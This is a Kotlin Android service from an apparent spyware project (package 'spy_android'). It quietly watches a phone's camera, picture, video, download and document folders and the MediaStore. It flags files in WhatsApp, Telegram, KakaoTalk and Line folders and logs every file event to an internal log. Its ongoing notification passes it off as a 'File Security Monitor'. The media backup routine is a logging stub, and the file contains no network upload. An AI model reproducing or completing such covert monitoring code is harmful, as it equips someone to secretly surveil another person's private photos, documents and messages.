package com.example.spy_android.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.FileObserver
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class FileMonitoringService : Service() {

    companion object {
        private const val TAG = "FileMonitoringService"
        private const val CHANNEL_ID = "FILE_MONITORING_CHANNEL"
        private const val NOTIFICATION_ID = 3001

        var instance: FileMonitoringService? = null
        var isMonitoring = false
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val fileObservers = mutableListOf<FileObserver>()
    private val contentObservers = mutableListOf<ContentObserver>()
    private val handler = Handler(Looper.getMainLooper())

    // 모니터링할 디렉토리들
    private val monitoringPaths = listOf(
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
    )

    override fun onCreate() {
        super.onCreate()
        instance = this

        createNotificationChannel()
        Log.d(TAG, "파일 모니터링 서비스 생성됨")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundService()
        startFileMonitoring()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        stopFileMonitoring()
        serviceScope.cancel()
        instance = null

        Log.d(TAG, "파일 모니터링 서비스 종료됨")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "File Monitoring Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Monitors file system changes for security purposes"
                setShowBadge(false)
            }

            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("File Security Monitor")
            .setContentText("Monitoring file system for security threats...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startFileMonitoring() {
        isMonitoring = true

        serviceScope.launch {
            try {
                // 디렉토리 감시자 설정
                setupDirectoryWatchers()

                // 미디어 저장소 감시자 설정
                setupMediaStoreWatchers()

                // 주기적 파일 스캔
                startPeriodicFileScan()

                logFileEvent("MONITORING_STARTED", "File monitoring system activated")
                Log.d(TAG, "파일 모니터링 시작됨")

            } catch (e: Exception) {
                Log.e(TAG, "파일 모니터링 시작 오류: ${e.message}")
            }
        }
    }

    private suspend fun setupDirectoryWatchers() {
        withContext(Dispatchers.IO) {
            for (path in monitoringPaths) {
                try {
                    if (path.exists() && path.canRead()) {
                        val observer = CustomFileObserver(path.absolutePath)
                        observer.startWatching()
                        fileObservers.add(observer)

                        Log.d(TAG, "디렉토리 감시 시작: ${path.absolutePath}")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "디렉토리 감시 설정 오류: ${path.absolutePath} - ${e.message}")
                }
            }
        }
    }

    private fun setupMediaStoreWatchers() {
        try {
            // 이미지 감시
            val imageObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    serviceScope.launch {
                        handleMediaStoreChange("IMAGE", uri)
                    }
                }
            }
            contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                imageObserver
            )
            contentObservers.add(imageObserver)

            // 비디오 감시
            val videoObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    serviceScope.launch {
                        handleMediaStoreChange("VIDEO", uri)
                    }
                }
            }
            contentResolver.registerContentObserver(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                true,
                videoObserver
            )
            contentObservers.add(videoObserver)

            // 오디오 감시
            val audioObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    serviceScope.launch {
                        handleMediaStoreChange("AUDIO", uri)
                    }
                }
            }
            contentResolver.registerContentObserver(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                true,
                audioObserver
            )
            contentObservers.add(audioObserver)

            Log.d(TAG, "미디어 저장소 감시 설정 완료")

        } catch (e: Exception) {
            Log.e(TAG, "미디어 저장소 감시 설정 오류: ${e.message}")
        }
    }

    private fun startPeriodicFileScan() {
        serviceScope.launch {
            while (isMonitoring) {
                try {
                    performFullFileScan()
                    delay(30 * 60 * 1000) // 30분마다 전체 스캔
                } catch (e: Exception) {
                    Log.e(TAG, "주기적 파일 스캔 오류: ${e.message}")
                    delay(60 * 1000) // 오류 시 1분 후 재시도
                }
            }
        }
    }

    private suspend fun handleMediaStoreChange(mediaType: String, uri: Uri?) {
        withContext(Dispatchers.IO) {
            try {
                if (uri != null) {
                    val mediaInfo = getMediaFileInfo(uri, mediaType)
                    if (mediaInfo != null) {
                        logMediaChange(mediaType, mediaInfo)

                        // 중요한 미디어 파일인 경우 백업
                        if (isImportantMediaFile(mediaInfo)) {
                            backupMediaFile(mediaInfo)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "미디어 변경 처리 오류: ${e.message}")
            }
        }
    }

    private fun getMediaFileInfo(uri: Uri, mediaType: String): Map<String, Any>? {
        return try {
            val cursor = contentResolver.query(uri, null, null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    val displayNameIndex = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                    val sizeIndex = it.getColumnIndex(MediaStore.MediaColumns.SIZE)
                    val dateAddedIndex = it.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED)
                    val dataIndex = it.getColumnIndex(MediaStore.MediaColumns.DATA)

                    mapOf(
                        "media_type" to mediaType,
                        "uri" to uri.toString(),
                        "display_name" to (if (displayNameIndex >= 0) it.getString(displayNameIndex) else "Unknown"),
                        "size" to (if (sizeIndex >= 0) it.getLong(sizeIndex) else 0L),
                        "date_added" to (if (dateAddedIndex >= 0) it.getLong(dateAddedIndex) else 0L),
                        "file_path" to (if (dataIndex >= 0) it.getString(dataIndex) else "Unknown"),
                        "timestamp" to System.currentTimeMillis()
                    )
                } else null
            }
        } catch (e: Exception) {
            Log.e(TAG, "미디어 파일 정보 획득 오류: ${e.message}")
            null
        }
    }

    private suspend fun performFullFileScan() {
        withContext(Dispatchers.IO) {
            try {
                val scanResults = mutableListOf<Map<String, Any>>()

                for (path in monitoringPaths) {
                    if (path.exists() && path.canRead()) {
                        scanDirectory(path, scanResults, 0, 3) // 최대 3단계 깊이
                    }
                }

                val scanSummary = mapOf(
                    "scan_type" to "FULL_SCAN",
                    "total_files_found" to scanResults.size,
                    "scan_duration" to "completed",
                    "timestamp" to System.currentTimeMillis(),
                    "formatted_time" to getCurrentTimeString()
                )

                logFileEvent("FULL_SCAN_COMPLETED", scanSummary.toString())

                // 새로운 파일들 중 중요한 것들 식별
                identifyImportantFiles(scanResults)

            } catch (e: Exception) {
                Log.e(TAG, "전체 파일 스캔 오류: ${e.message}")
            }
        }
    }

    private fun scanDirectory(
        directory: File,
        results: MutableList<Map<String, Any>>,
        depth: Int,
        maxDepth: Int
    ) {
        if (depth > maxDepth) return

        try {
            val files = directory.listFiles() ?: return

            for (file in files) {
                try {
                    if (file.isFile) {
                        val fileInfo = mapOf(
                            "file_name" to file.name,
                            "file_path" to file.absolutePath,
                            "file_size" to file.length(),
                            "last_modified" to file.lastModified(),
                            "file_extension" to getFileExtension(file.name),
                            "is_hidden" to file.isHidden,
                            "can_read" to file.canRead(),
                            "timestamp" to System.currentTimeMillis()
                        )

                        results.add(fileInfo)

                        // 중요한 파일 확장자 감지
                        if (isImportantFileType(file.name)) {
                            logImportantFileFound(fileInfo)
                        }

                    } else if (file.isDirectory && depth < maxDepth) {
                        scanDirectory(file, results, depth + 1, maxDepth)
                    }
                } catch (e: Exception) {
                    // 개별 파일 처리 오류는 무시하고 계속 진행
                    continue
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "디렉토리 스캔 오류: ${directory.absolutePath} - ${e.message}")
        }
    }

    private suspend fun identifyImportantFiles(scanResults: List<Map<String, Any>>) {
        withContext(Dispatchers.IO) {
            val importantFiles = scanResults.filter { fileInfo ->
                val fileName = fileInfo["file_name"] as? String ?: ""
                val filePath = fileInfo["file_path"] as? String ?: ""

                isImportantFileType(fileName) ||
                        isImportantDirectory(filePath) ||
                        isLargeFile(fileInfo["file_size"] as? Long ?: 0L)
            }

            if (importantFiles.isNotEmpty()) {
                val importantFilesData = mapOf(
                    "event_type" to "IMPORTANT_FILES_FOUND",
                    "file_count" to importantFiles.size,
                    "files" to importantFiles,
                    "timestamp" to System.currentTimeMillis()
                )

                logFileEvent("IMPORTANT_FILES_SCAN", importantFilesData.toString())
            }
        }
    }

    private fun isImportantFileType(fileName: String): Boolean {
        val importantExtensions = listOf(
            "jpg", "jpeg", "png", "gif", "bmp", "webp", // 이미지
            "mp4", "avi", "mkv", "mov", "wmv", "3gp", // 비디오
            "mp3", "wav", "flac", "aac", "ogg", // 오디오
            "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", // 문서
            "txt", "log", "xml", "json", "csv", // 텍스트
            "apk", "zip", "rar", "7z", // 아카이브
            "db", "sqlite", "sql" // 데이터베이스
        )

        val extension = getFileExtension(fileName).lowercase()
        return importantExtensions.contains(extension)
    }

    private fun isImportantDirectory(filePath: String): Boolean {
        val importantPaths = listOf(
            "whatsapp", "telegram", "kakaotalk", "line", // 메신저
            "download", "downloads", "documents", // 다운로드/문서
            "dcim", "camera", "pictures", // 카메라/사진
            "music", "movies", "video" // 미디어
        )

        return importantPaths.any { filePath.lowercase().contains(it) }
    }

    private fun isLargeFile(fileSize: Long): Boolean {
        return fileSize > 50 * 1024 * 1024 // 50MB 이상
    }

    private fun isImportantMediaFile(mediaInfo: Map<String, Any>): Boolean {
        val fileName = mediaInfo["display_name"] as? String ?: ""
        val fileSize = mediaInfo["size"] as? Long ?: 0L

        return isImportantFileType(fileName) || fileSize > 10 * 1024 * 1024 // 10MB 이상
    }

    private suspend fun backupMediaFile(mediaInfo: Map<String, Any>) {
        withContext(Dispatchers.IO) {
            try {
                val backupData = mapOf(
                    "event_type" to "MEDIA_BACKUP",
                    "media_info" to mediaInfo,
                    "backup_status" to "INITIATED",
                    "timestamp" to System.currentTimeMillis()
                )

                logFileEvent("MEDIA_BACKUP", backupData.toString())

                // 실제 백업 로직은 여기에 구현 (파일 복사 등)
                // 보안상 실제 파일 복사는 구현하지 않고 로그만 남김

            } catch (e: Exception) {
                Log.e(TAG, "미디어 파일 백업 오류: ${e.message}")
            }
        }
    }

    private fun getFileExtension(fileName: String): String {
        val lastDotIndex = fileName.lastIndexOf('.')
        return if (lastDotIndex > 0 && lastDotIndex < fileName.length - 1) {
            fileName.substring(lastDotIndex + 1)
        } else {
            ""
        }
    }

    private fun getCurrentTimeString(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
    }

    // 커스텀 파일 관찰자
    private inner class CustomFileObserver(path: String) : FileObserver(path, ALL_EVENTS) {
        private val watchPath = path

        override fun onEvent(event: Int, path: String?) {
            serviceScope.launch {
                handleFileSystemEvent(event, path, watchPath)
            }
        }
    }

    private suspend fun handleFileSystemEvent(event: Int, fileName: String?, basePath: String) {
        withContext(Dispatchers.IO) {
            try {
                val eventType = getFileEventType(event)
                val fullPath = if (fileName != null) "$basePath/$fileName" else basePath

                val fileEventData = mapOf(
                    "event_type" to "FILE_SYSTEM_EVENT",
                    "file_event" to eventType,
                    "file_name" to (fileName ?: "unknown"),
                    "full_path" to fullPath,
                    "base_path" to basePath,
                    "timestamp" to System.currentTimeMillis(),
                    "formatted_time" to getCurrentTimeString()
                )

                logFileEvent("FILE_SYSTEM_CHANGE", fileEventData.toString())

                // 중요한 파일 이벤트인 경우 추가 로깅
                if (fileName != null && isImportantFileType(fileName)) {
                    logImportantFileEvent(eventType, fullPath, fileName)
                }

            } catch (e: Exception) {
                Log.e(TAG, "파일 시스템 이벤트 처리 오류: ${e.message}")
            }
        }
    }

    private fun getFileEventType(event: Int): String {
        return when (event and ALL_EVENTS) {
            CREATE -> "FILE_CREATED"
            DELETE -> "FILE_DELETED"
            MODIFY -> "FILE_MODIFIED"
            MOVED_FROM -> "FILE_MOVED_FROM"
            MOVED_TO -> "FILE_MOVED_TO"
            OPEN -> "FILE_OPENED"
            CLOSE_WRITE -> "FILE_CLOSED_WRITE"
            CLOSE_NOWRITE -> "FILE_CLOSED_NOWRITE"
            else -> "FILE_EVENT_${event}"
        }
    }

    private suspend fun logFileEvent(eventType: String, details: String) {
        withContext(Dispatchers.IO) {
            try {
                val logDir = File(filesDir, "logs")
                if (!logDir.exists()) {
                    logDir.mkdirs()
                }

                val logFile = File(logDir, "file_monitoring.log")
                val logEntry = mapOf(
                    "event_type" to eventType,
                    "details" to details,
                    "timestamp" to System.currentTimeMillis(),
                    "formatted_time" to getCurrentTimeString()
                )

                val jsonData = android.text.TextUtils.join(",", logEntry.map { "\"${it.key}\":\"${it.value}\"" })
                logFile.appendText("{$jsonData}\n")

            } catch (e: Exception) {
                Log.e(TAG, "파일 이벤트 로그 저장 실패: ${e.message}")
            }
        }
    }

    private suspend fun logMediaChange(mediaType: String, mediaInfo: Map<String, Any>) {
        val mediaChangeData = mapOf(
            "event_type" to "MEDIA_CHANGE",
            "media_type" to mediaType,
            "media_info" to mediaInfo,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        logFileEvent("MEDIA_STORE_CHANGE", mediaChangeData.toString())
    }

    private suspend fun logImportantFileFound(fileInfo: Map<String, Any>) {
        val importantFileData = mapOf(
            "event_type" to "IMPORTANT_FILE_FOUND",
            "file_info" to fileInfo,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        logFileEvent("IMPORTANT_FILE_DISCOVERY", importantFileData.toString())
    }

    private suspend fun logImportantFileEvent(eventType: String, fullPath: String, fileName: String) {
        val importantEventData = mapOf(
            "event_type" to "IMPORTANT_FILE_EVENT",
            "file_event" to eventType,
            "file_name" to fileName,
            "full_path" to fullPath,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        logFileEvent("IMPORTANT_FILE_ACTIVITY", importantEventData.toString())
    }

    private fun stopFileMonitoring() {
        isMonitoring = false

        // 파일 관찰자들 정지
        fileObservers.forEach { observer ->
            try {
                observer.stopWatching()
            } catch (e: Exception) {
                Log.e(TAG, "파일 관찰자 정지 오류: ${e.message}")
            }
        }
        fileObservers.clear()

        // 콘텐츠 관찰자들 해제
        contentObservers.forEach { observer ->
            try {
                contentResolver.unregisterContentObserver(observer)
            } catch (e: Exception) {
                Log.e(TAG, "콘텐츠 관찰자 해제 오류: ${e.message}")
            }
        }
        contentObservers.clear()

        Log.d(TAG, "파일 모니터링 중지됨")
    }

    // 외부에서 호출할 수 있는 메서드들
    fun getMonitoringStatus(): Map<String, Any> {
        return mapOf(
            "is_monitoring" to isMonitoring,
            "active_file_observers" to fileObservers.size,
            "active_content_observers" to contentObservers.size,
            "monitoring_paths" to monitoringPaths.map { it.absolutePath },
            "timestamp" to System.currentTimeMillis()
        )
    }

    fun forceFileScan() {
        if (isMonitoring) {
            serviceScope.launch {
                performFullFileScan()
            }
        }
    }
}